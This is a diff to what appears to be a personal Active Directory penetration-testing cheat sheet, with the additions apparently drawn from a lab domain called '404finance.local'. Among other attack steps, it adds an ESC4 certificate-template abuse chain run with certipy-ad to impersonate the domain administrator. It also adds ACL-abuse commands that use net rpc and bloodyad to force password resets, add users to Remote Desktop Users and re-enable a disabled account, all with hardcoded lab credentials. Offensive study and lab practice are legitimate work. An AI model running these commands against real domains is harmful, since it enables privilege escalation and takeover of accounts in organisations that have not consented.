@@ -881,7 +881,7 @@ kerbrute userenum generated_usernames.txt --dc $target -d Domain
 kerbrute userenum /usr/share/Usernames/Names/names.txt --dc $target -d Domain
 ```
 
-## With Credentials :
+### With Credentials :
 
 #### Generating Users :
 
@@ -1082,6 +1082,24 @@ certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target -ldap-shell
 #
 #change_password administrator NewPassword123!
 
+
+# ESC4 :
+
+1/ modify the Template to make it Vulnerable :
+certipy-ad template \
+    -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' \
+    -dc-ip $target -template 'Vuln-ESC4' \  
+    -write-default-configuration
+
+2/ Just like an ESC1 now , First we request a Ticket : 
+certipy-ad req \
+    -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' \
+    -dc-ip $target -target 'DC-404.404finance.local' \
+    -ca '404finance-DC-404-CA' -template 'Vuln-ESC4' \
+    -upn 'administrator@404finance.local' -sid 'S-1-5-21-2956725473-317782918-2795636496-500' 
+
+3/ Request a TGT using that Ticket :
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target 
 
 # ESC8 Abuse :
 
@@ -1697,6 +1715,17 @@ xfreerdp /v:$target /u:username /p:password /cert:ignore +clipboard /dynamic-res
 ### ACL Abuse :
 
 ```bash
+
+# Force Change Password :
+net rpc password "ROBERT.GRAEF" "Password.123" -U "404FINANCE.LOCAL"/"tom.reboot"%"P@ssw0rd123" -S "DC-404.404finance.local" 
+bloodyad --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' set password 'MELANIE.KUNZ' 'WEAK123.' 
+
+# Add Group Member :
+bloodyad  --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' add groupMember 'REMOTE DESKTOP USERS' 'MELANIE.KUNZ'
+
+# WriteAccountRestrictions : To remove a specific ACL (Eg : Enable a specific account ) :
+bloodyad --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' remove uac 'svc.services' -f ACCOUNTDISABLE
+
 # ACL Check : to verify the User's ACLs via Powershell : 
 $user = Get-DomainUser svc-backup
 Get-DomainObjectAcl -Identity (Get-Domain).DistinguishedName -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser jbercov).objectsid} |Select ObjectAceType, ActiveDirectoryRig
